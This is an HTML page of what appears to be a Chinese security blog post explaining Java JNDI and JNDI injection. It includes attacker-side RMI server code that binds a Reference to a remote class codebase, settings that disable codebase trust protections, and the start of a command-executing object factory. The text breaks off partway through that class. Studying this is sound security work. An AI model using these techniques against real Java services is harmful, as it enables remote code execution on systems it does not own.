@@ -1,0 +1,1409 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="dark">
+    <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
+    <meta charset="UTF-8" />
+
+    <meta name="generator" content="Hugo 0.88.1" /><meta name="theme-color" content="#16171d" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    
+    <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
+    
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    
+    <meta http-equiv="Cache-Control" content="no-siteapp" />
+
+    <title>Java JNDI分析与利用 | MYZXCG</title>
+
+    <link rel="stylesheet" href="/css/meme.min.ee7d92038178eda958210f69458541e2686ada11055b93762d6d324f2acc47c5.css"/>
+
+    
+    
+        <script src="/js/meme.min.4194bf2034241e3757fbbbf5fe4db43d0ff17c81f4496e6bc931504f0978cbd2.js"></script>
+
+    
+
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=EB&#43;Garamond:ital,wght@0,400;0,500;0,700;1,400;1,700&amp;family=Noto&#43;Serif&#43;SC:wght@400;500;700&amp;family=Source&#43;Code&#43;Pro:ital,wght@0,400;0,700;1,400;1,700&amp;display=swap" media="print" onload="this.media='all'" />
+        <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=EB&#43;Garamond:ital,wght@0,400;0,500;0,700;1,400;1,700&amp;family=Noto&#43;Serif&#43;SC:wght@400;500;700&amp;family=Source&#43;Code&#43;Pro:ital,wght@0,400;0,700;1,400;1,700&amp;display=swap" /></noscript>
+
+    <meta name="author" content="myzxcg" /><meta name="description" content="JNDI(Java Naming and Directory Interface)本质是可以操作目录服务、域名服务的一组接口。JNDI相当……" />
+
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg" color="" />
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png" />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-title" content="MYZXCG" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black" />
+    <meta name="mobile-web-app-capable" content="yes" />
+    <meta name="application-name" content="MYZXCG" />
+    <meta name="msapplication-starturl" content="../../../" />
+    <meta name="msapplication-TileColor" content="#603cba" />
+    <meta name="msapplication-TileImage" content="../../../icons/mstile-150x150.png" />
+    <link rel="manifest" href="/manifest.json" />
+
+
+    
+    
+
+    
+    <link rel="canonical" href="https://myzxcg.com/2021/10/Java-JNDI%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/" />
+    
+
+<script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "BlogPosting",
+        "datePublished": "2021-10-26T00:00:20+08:00",
+        "dateModified": "2021-11-20T15:04:33+08:00",
+        "url": "https://myzxcg.com/2021/10/Java-JNDI%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/",
+        "headline": "Java JNDI分析与利用",
+        "description": "JNDI(Java Naming and Directory Interface)本质是可以操作目录服务、域名服务的一组接口。JNDI相当……",
+        "inLanguage" : "zh-CN",
+        "articleSection": "posts",
+        "wordCount":  4303 ,
+        "image": "https://myzxcg.com/icons/favicon.ico",
+        "author": {
+            "@type": "Person",
+            "description": "专注于Web安全、内网渗透. 记录学习与渗透过程中遇到的有意思的点, 分享技巧与知识. 欢迎交流～",
+            "email": "myzx.xcg@gmail.com",
+            "image": "https://myzxcg.com/avatar.png",
+            "url": "https://myzxcg.com/",
+            "name": "myzxcg"
+        },
+        "license": "[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)",
+        "publisher": {
+            "@type": "Organization",
+            "name": "MYZXCG",
+            "logo": {
+                "@type": "ImageObject",
+                "url": "https://myzxcg.com/icons/favicon.ico"
+            },
+            "url": "https://myzxcg.com/"
+        },
+        "mainEntityOfPage": {
+            "@type": "WebSite",
+            "@id": "https://myzxcg.com/"
+        }
+    }
+</script>
+
+    
+
+<meta name="twitter:card" content="summary" />
+
+<meta name="twitter:site" content="@myzxcg" />
+<meta name="twitter:creator" content="@myzxcg" />
+
+    
+
+
+
+<meta property="og:title" content="Java JNDI分析与利用" />
+<meta property="og:description" content="JNDI(Java Naming and Directory Interface)本质是可以操作目录服务、域名服务的一组接口。JNDI相当……" />
+<meta property="og:url" content="https://myzxcg.com/2021/10/Java-JNDI%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/" />
+<meta property="og:site_name" content="MYZXCG" />
+<meta property="og:locale" content="zh" /><meta property="og:image" content="https://myzxcg.com/icons/favicon.ico" />
+    <meta property="og:type" content="article" />
+    <meta property="article:published_time" content="2021-10-26T00:00:20&#43;08:00" />
+    <meta property="article:modified_time" content="2021-11-20T15:04:33&#43;08:00" />
+    
+    <meta property="article:section" content="posts" />
+
+
+        <link rel="preconnect" href="https://www.google-analytics.com" crossorigin />
+
+        
+
+
+    
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-Y0LZRMN44V"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'G-Y0LZRMN44V');
+    </script>
+
+
+
+
+    
+    
+
+    
+</head>
+
+    <body>
+        <div class="container">
+            
+    <header class="header">
+        
+            <div class="header-wrapper">
+                <div class="header-inner single">
+                    
+    <div class="site-brand">
+        
+            <a href="/" class="brand">MYZXCG</a>
+        
+    </div>
+
+                    <nav class="nav">
+    <ul class="menu" id="menu">
+        
+            
+        
+        
+        
+        
+            
+                <li class="menu-item"><a href="/archives/"><span class="menu-item-name">文章</span></a>
+                </li>
+            
+        
+            
+                <li class="menu-item"><a href="/tags/"><span class="menu-item-name">标签</span></a>
+                </li>
+            
+        
+            
+                <li class="menu-item"><a href="/about/"><span class="menu-item-name">关于</span></a>
+                </li>
+            
+        
+            
+                
+                    
+                    
+                
+            
+        
+            
+                
+            
+        
+    </ul>
+</nav>
+
+                    
+                </div>
+            </div>
+            
+    <input type="checkbox" id="nav-toggle" aria-hidden="true" />
+    <label for="nav-toggle" class="nav-toggle"></label>
+    <label for="nav-toggle" class="nav-curtain"></label>
+
+
+        
+    </header>
+
+
+
+
+            
+            
+    <main class="main single" id="main">
+    <div class="main-inner">
+
+        
+
+        <article class="content post h-entry" data-align="justify" data-type="posts" data-toc-num="true">
+
+            <h1 class="post-title p-name">Java JNDI分析与利用</h1>
+
+            
+
+            
+                
+            
+
+            
+                
+
+<div class="post-meta">
+    
+        
+        <time datetime="2021-10-26T00:00:20&#43;08:00" class="post-meta-item published dt-published"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M400 64h-48V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H160V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H48C21.49 64 0 85.49 0 112v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm-6 400H54a6 6 0 0 1-6-6V160h352v298a6 6 0 0 1-6 6zm-52.849-200.65L198.842 404.519c-4.705 4.667-12.303 4.637-16.971-.068l-75.091-75.699c-4.667-4.705-4.637-12.303.068-16.971l22.719-22.536c4.705-4.667 12.303-4.637 16.97.069l44.104 44.461 111.072-110.181c4.705-4.667 12.303-4.637 16.971.068l22.536 22.718c4.667 4.705 4.636 12.303-.069 16.97z"/></svg>&nbsp;2021.10.26</time>
+    
+    
+    
+    
+        
+        
+        
+            
+        
+    
+    
+    
+        
+        <span class="post-meta-item reading-time"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"/></svg>&nbsp;9&nbsp;分钟</span>
+    
+
+   
+    
+
+    
+    
+</div>
+
+            
+
+            <nav class="contents">
+  <h2 id="contents" class="contents-title">目录</h2><ol class="toc">
+    <li><a id="contents:基础概念" href="#基础概念">基础概念</a>
+      <ol>
+        <li><a id="contents:jndi-目录服务" href="#jndi-目录服务">JNDI 目录服务</a></li>
+        <li><a id="contents:jndi-reference" href="#jndi-reference">JNDI Reference</a></li>
+      </ol>
+    </li>
+    <li><a id="contents:jndi-注入" href="#jndi-注入">JNDI 注入</a>
+      <ol>
+        <li><a id="contents:jndi--rmi" href="#jndi--rmi">JNDI + RMI</a></li>
+        <li><a id="contents:jndi--ldap" href="#jndi--ldap">JNDI + LDAP</a></li>
+      </ol>
+    </li>
+    <li><a id="contents:绕过jdk-8u191高版本限制" href="#绕过jdk-8u191高版本限制">绕过JDK 8u191+高版本限制</a>
+      <ol>
+        <li><a id="contents:利用elprocessor" href="#利用elprocessor">利用ELProcessor</a></li>
+        <li><a id="contents:利用ldap反序列化数据" href="#利用ldap反序列化数据">利用LDAP反序列化数据</a></li>
+        <li><a id="contents:利用rmi反序列化数据" href="#利用rmi反序列化数据">利用RMI反序列化数据</a></li>
+      </ol>
+    </li>
+    <li><a id="contents:参考" href="#参考">参考</a></li>
+  </ol>
+</nav><div class="post-body e-content">
+                <blockquote>
+<p>JNDI(Java Naming and Directory Interface)本质是可以操作目录服务、域名服务的一组接口。JNDI相当于在LDAP、RMI等服务外面再套了一层API，方便统一调用。调用JNDI的API可以定位资源和其他程序对象。JNDI可访问的现有的目录及服务有: JDBC、LDAP、RMI、DNS、NIS、CORBA。</p>
+</blockquote>
+<h2 id="基础概念"><a href="#基础概念" class="anchor-link">#</a><a href="#contents:基础概念" class="headings">基础概念</a></h2>
+<p><strong>Naming Service 命名服务</strong></p>
+<p>命名服务将名称和对象进行关联，提供通过名称找到对象的操作。</p>
+<p><strong>Directory Service 目录服务</strong></p>
+<p>目录服务是命名服务的扩展，除了提供名称和对象的关联，还允许对象具有属性。目录服务中的对象称之为目录对象。目录服务提供创建、添加、删除目录对象以及修改目录对象属性等操作。</p>
+<p><strong>Reference 引用</strong></p>
+<p>在一些命名服务系统中，系统并不是直接将对象存储在系统中，而是保持对象的引用。引用包含了如何访问实际对象的信息。</p>
+<p>在JDK里面提供了5个包，提供给JNDI的功能实现。</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="n">javax</span><span class="o">.</span><span class="na">naming</span> <span class="c1">//主要用于命名操作，包含了命名服务的类和接口，定义了Context接口和InitialContext类
+</span><span class="c1"></span><span class="n">javax</span><span class="o">.</span><span class="na">naming</span><span class="o">.</span><span class="na">directory</span> <span class="c1">//主要用于目录操作，它定义了DirContext接口和InitialDirContext类
+</span><span class="c1"></span><span class="n">javax</span><span class="o">.</span><span class="na">naming</span><span class="o">.</span><span class="na">event</span> <span class="c1">//在命名目录服务器中请求事件通知
+</span><span class="c1"></span><span class="n">javax</span><span class="o">.</span><span class="na">naming</span><span class="o">.</span><span class="na">ldap</span> <span class="c1">//提供LDAP支持
+</span><span class="c1"></span><span class="n">javax</span><span class="o">.</span><span class="na">naming</span><span class="o">.</span><span class="na">spi</span> <span class="c1">//允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务
+</span></code></pre></td></tr></table></div>
+</div>
+</div><h3 id="jndi-目录服务"><a href="#jndi-目录服务" class="anchor-link">#</a><a href="#contents:jndi-目录服务" class="headings">JNDI 目录服务</a></h3>
+<p><code>Context.INITIAL_CONTEXT_FACTORY</code>(初始上下文工厂的环境属性名称) 指的是JNDI服务处理的具体类名称，如：DNS服务可以使用<code>com.sun.jndi.dns.DnsContextFactory</code>类来处理。</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="c1">// 创建环境变量对象
+</span><span class="c1"></span><span class="n">Hashtable</span> <span class="n">env</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Hashtable</span><span class="o">();</span>
+
+<span class="c1">// 设置JNDI初始化工厂类名
+</span><span class="c1"></span><span class="n">env</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">Context</span><span class="o">.</span><span class="na">INITIAL_CONTEXT_FACTORY</span><span class="o">,</span> <span class="s">&#34;类名&#34;</span><span class="o">);</span>
+
+<span class="c1">// 设置JNDI提供服务的URL地址
+</span><span class="c1"></span><span class="n">env</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">Context</span><span class="o">.</span><span class="na">PROVIDER_URL</span><span class="o">,</span> <span class="s">&#34;url&#34;</span><span class="o">);</span>
+
+<span class="c1">// 创建JNDI目录服务对象
+</span><span class="c1"></span><span class="n">DirContext</span> <span class="n">context</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InitialDirContext</span><span class="o">(</span><span class="n">env</span><span class="o">);</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>以RMI远程调用为例</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">jndi</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">rmiserver.user</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">javax.naming.Context</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.naming.directory.DirContext</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.naming.directory.InitialDirContext</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Hashtable</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">run</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+        <span class="c1">// 创建环境变量对象
+</span><span class="c1"></span>        <span class="n">Hashtable</span> <span class="n">env</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Hashtable</span><span class="o">();</span>
+
+        <span class="c1">// 设置JNDI初始化工厂类名
+</span><span class="c1"></span>        <span class="n">env</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">Context</span><span class="o">.</span><span class="na">INITIAL_CONTEXT_FACTORY</span><span class="o">,</span> <span class="s">&#34;com.sun.jndi.rmi.registry.RegistryContextFactory&#34;</span><span class="o">);</span>
+        <span class="c1">// 设置JNDI提供服务的URL地址
+</span><span class="c1"></span>        <span class="n">env</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">Context</span><span class="o">.</span><span class="na">PROVIDER_URL</span><span class="o">,</span> <span class="s">&#34;rmi://127.0.0.1:1099&#34;</span><span class="o">);</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="c1">// 创建JNDI目录服务对象
+</span><span class="c1"></span>            <span class="n">DirContext</span> <span class="n">context</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InitialDirContext</span><span class="o">(</span><span class="n">env</span><span class="o">);</span>
+
+            <span class="c1">// 通过命名服务查找远程RMI绑定的user对象
+</span><span class="c1"></span>            <span class="n">user</span> <span class="n">testInterface</span> <span class="o">=</span> <span class="o">(</span><span class="n">user</span><span class="o">)</span> <span class="n">context</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="s">&#34;hello&#34;</span><span class="o">);</span>
+
+            <span class="c1">// 调用远程的user接口的hello方法
+</span><span class="c1"></span>            <span class="n">String</span> <span class="n">result</span> <span class="o">=</span> <span class="n">testInterface</span><span class="o">.</span><span class="na">hello</span><span class="o">(</span><span class="s">&#34;das&#34;</span><span class="o">);</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">result</span><span class="o">);</span>
+        <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>JNDI协议转换: 如果JNDI在lookup时没有指定初始化工厂名称，会自动根据协议类型动态查找内置的工厂类然后创建处理对应的服务请求。上面的代码可以简写为:</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">jndi</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">rmiserver.user</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">javax.naming.directory.DirContext</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.naming.directory.InitialDirContext</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">run</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="c1">// 创建JNDI目录服务对象
+</span><span class="c1"></span>            <span class="n">DirContext</span> <span class="n">context</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InitialDirContext</span><span class="o">();</span>
+
+            <span class="c1">// 通过命名服务查找远程RMI绑定的user对象
+</span><span class="c1"></span>            <span class="n">user</span> <span class="n">testInterface</span> <span class="o">=</span> <span class="o">(</span><span class="n">user</span><span class="o">)</span> <span class="n">context</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="s">&#34;rmi://127.0.0.1:1099/hello&#34;</span><span class="o">);</span>
+
+            <span class="c1">// 调用远程的user接口的hello方法
+</span><span class="c1"></span>            <span class="n">String</span> <span class="n">result</span> <span class="o">=</span> <span class="n">testInterface</span><span class="o">.</span><span class="na">hello</span><span class="o">(</span><span class="s">&#34;das&#34;</span><span class="o">);</span>
+
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">result</span><span class="o">);</span>
+        <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><h3 id="jndi-reference"><a href="#jndi-reference" class="anchor-link">#</a><a href="#contents:jndi-reference" class="headings">JNDI Reference</a></h3>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="c1">//正常的RMI调用
+</span><span class="c1"></span><span class="n">Context</span> <span class="n">context</span> <span class="o">=</span> <span class="k">new</span>  <span class="n">InitialContext</span><span class="o">();</span>
+<span class="n">context</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="s">&#34;rmi://10.0.0.2:1099/evil&#34;</span><span class="o">);</span>
+<span class="c1">//此时执行evil所绑定的类，依然是在10.0.0.2上执行，无法影响到客户端，因此要引入一个新的概念Reference。
+</span></code></pre></td></tr></table></div>
+</div>
+</div><p>在JNDI服务中，RMI服务端除了直接绑定远程对象之外，还可以通过References类来绑定一个外部的远程对象。当客户端在lookup()查找这个远程对象时，客户端会获取相应的object factory，最终通过factory类将reference转换为具体的对象实例，JNDI调用远程Reference的时候会先尝试从本地的CLASSPATH中寻找该类，如果没有才用URLClassLoader远程进行加载。之后会执行该类的静态代码块、代码块、无参构造函数和getObjectInstance方法。</p>
+<p><strong>RMI/LDAP远程对象引用安全限制</strong></p>
+<ol>
+<li>
+<p>RMI</p>
+<p>在RMI服务中引用远程对象将受本地Java环境限制，本地的<code>java.rmi.server.useCodebaseOnly</code>配置如果为<code>true(禁止引用远程对象)</code>，为false则允许加载远程类文件。</p>
+<p>除此之外被引用的ObjectFactory对象还将受到<code>com.sun.jndi.rmi.object.trustURLCodebase</code>配置限制，如果该值为<code>false(不信任远程引用对象)</code>，一样无法调用远程的引用对象。</p>
+<ul>
+<li><code>JDK5u45、JDK6u45、JDK7u21、JDK8u121</code>开始，<code>java.rmi.server.useCodebaseOnly</code>默认值改为了true。</li>
+<li><code>JDK6u132、JDK7u122、JDK8u113</code>开始<code>com.sun.jndi.rmi.object.trustURLCodebase</code>默认值改为了 false。</li>
+</ul>
+<p>本地测试远程对象引用可以使用如下方式允许加载远程的引用对象</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="n">System</span><span class="o">.</span><span class="na">setProperty</span><span class="o">(</span><span class="s">&#34;java.rmi.server.useCodebaseOnly&#34;</span><span class="o">,</span> <span class="s">&#34;false&#34;</span><span class="o">);</span>
+<span class="n">System</span><span class="o">.</span><span class="na">setProperty</span><span class="o">(</span><span class="s">&#34;com.sun.jndi.rmi.object.trustURLCodebase&#34;</span><span class="o">,</span> <span class="s">&#34;true&#34;</span><span class="o">);</span>
+</code></pre></td></tr></table></div>
+</div>
+</div></li>
+<li>
+<p>LDAP</p>
+<p>LDAP也在<code>JDK6u211、7u201、8u191、11.0.1</code>后将<code>com.sun.jndi.ldap.object.trustURLCodebase</code>的默认设置为了false。（但不受<code>java.rmi.server.useCodebaseOnly</code>影响）</p>
+</li>
+</ol>
+<h2 id="jndi-注入"><a href="#jndi-注入" class="anchor-link">#</a><a href="#contents:jndi-注入" class="headings">JNDI 注入</a></h2>
+<p>调用了JNDI服务且lookup的参数值可控，还需JDK版本、服务器网络环境满足漏洞利用条件才可利用。</p>
+<h3 id="jndi--rmi"><a href="#jndi--rmi" class="anchor-link">#</a><a href="#contents:jndi--rmi" class="headings">JNDI + RMI</a></h3>
+<ul>
+<li>
+<p>服务端代码（利用的是远程引用Reference，不是反序列化）</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">jndi</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">com.sun.jndi.rmi.registry.ReferenceWrapper</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">javax.naming.Reference</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.registry.LocateRegistry</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.registry.Registry</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">server</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">String</span> <span class="n">url</span> <span class="o">=</span> <span class="s">&#34;http://127.0.0.1:8080/&#34;</span><span class="o">;</span>
+            <span class="n">Registry</span> <span class="n">registry</span> <span class="o">=</span> <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">createRegistry</span><span class="o">(</span><span class="n">1099</span><span class="o">);</span>
+            <span class="n">Reference</span> <span class="n">reference</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Reference</span><span class="o">(</span><span class="s">&#34;test&#34;</span><span class="o">,</span> <span class="s">&#34;test&#34;</span><span class="o">,</span> <span class="n">url</span><span class="o">);</span>
+            <span class="n">ReferenceWrapper</span> <span class="n">referenceWrapper</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ReferenceWrapper</span><span class="o">(</span><span class="n">reference</span><span class="o">);</span>
+            <span class="n">registry</span><span class="o">.</span><span class="na">bind</span><span class="o">(</span><span class="s">&#34;obj&#34;</span><span class="o">,</span> <span class="n">referenceWrapper</span><span class="o">);</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;running&#34;</span><span class="o">);</span>
+        <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div></li>
+<li>
+<p>执行命令的类</p>
+<p>JNDI允许通过对象工厂 (javax.naming.spi.ObjectFactory) 动态加载对象实现，对象工厂必须实现<code>javax.naming.spi.ObjectFactory</code>接口并重写getObjectInstance方法。</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.naming.Context</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.naming.Name</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.naming.spi.ObjectFactory</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Hashtable</span><span class="o">;</span>
+
